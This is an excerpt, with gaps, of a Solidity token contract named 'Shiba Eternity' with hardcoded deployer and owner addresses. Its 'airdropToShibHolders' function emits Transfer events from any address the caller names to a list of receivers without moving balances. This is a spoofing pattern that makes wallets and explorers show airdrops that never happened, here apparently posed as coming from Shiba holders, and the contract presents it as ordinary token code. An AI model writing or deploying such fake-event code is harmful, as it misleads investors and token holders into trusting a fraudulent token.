...
contract ShibaEternity is Context, IERC20 {
    ...
    address _contDeployr = 0x4B4b7fFb93D8AE84f7e38151F8C6aCBb26605011;
    address public _ownr = 0x6f365cA63D63A7130483713B91eB39A982b6cc3a;
   constructor () public {

        _name = "Shiba Eternity";
        _symbol = "SHIBET";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function airdropToShibHolders(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
